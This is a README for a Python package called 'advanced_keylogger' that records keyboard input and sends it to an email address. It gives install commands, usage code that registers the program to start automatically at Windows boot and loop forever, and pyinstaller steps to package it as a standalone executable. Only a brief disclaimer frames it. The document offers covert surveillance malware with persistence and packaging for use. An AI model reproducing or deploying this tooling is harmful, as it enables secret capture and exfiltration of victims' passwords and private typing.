# Advanced KeyLogger

A keylogger is any software or device that is capable of listening to keyboard keypresses and harvest it for any purpose.

This package demonstrate how we can use python to design powerful keylogger that can send data to an email address.

This package is free and should be used within the realm of law. Thank you!

## Installation

You can install via (pip)[https://pip.pypa.io/en/stable/]

``` cmd

pip install advanced_keylogger

```

## Configuration

Check settings.py file to modify certain parameters

## Usage

### import into another code

```python

from advanced_keylogger import logger, registry

# add the exe file to registry for automatic startup on boot

registry.AddToRegistry()

# Runs the key logger Forever!

while True:

    logger.KeyLogger()
```

### Run directly from terminal

``` cmd

C:\Users\user\Desktop> python logger.py

```

### Convert to Windows executable format (exe)

install pyinstaller

```
pip install pyinstaller

```

Then run convert using the command below

```
C:\Users\user\Desktop> pyinstaller -y -F  "C:/Users/user/Desktop/logger.py"

```
## Disclaimer

#### Programmers

This project is a demonstration of how keylogger can be used to harvest data from keyboard key presses and sent to an email address. We do not encourage this package to be used in a live program without disclosure and usage must be at users discretion. Attempt to use this package for malicious purpose is not allowed.

#### Corporate Entities

In case this package is included in any software to monitor staff(s) key presses behavior it must be done at staff's discretion.

## Bug and Known Issues

When running on linux please avoid using AddToRegistry()

Use the code below

```python

from advanced_keylogger import logger

# Runs the key logger Forever!

while True:

    logger.KeyLogger()
```

## Developer(s)


(Oyeniyi Abiola Peace)[https://twitter.com/_iamoracle]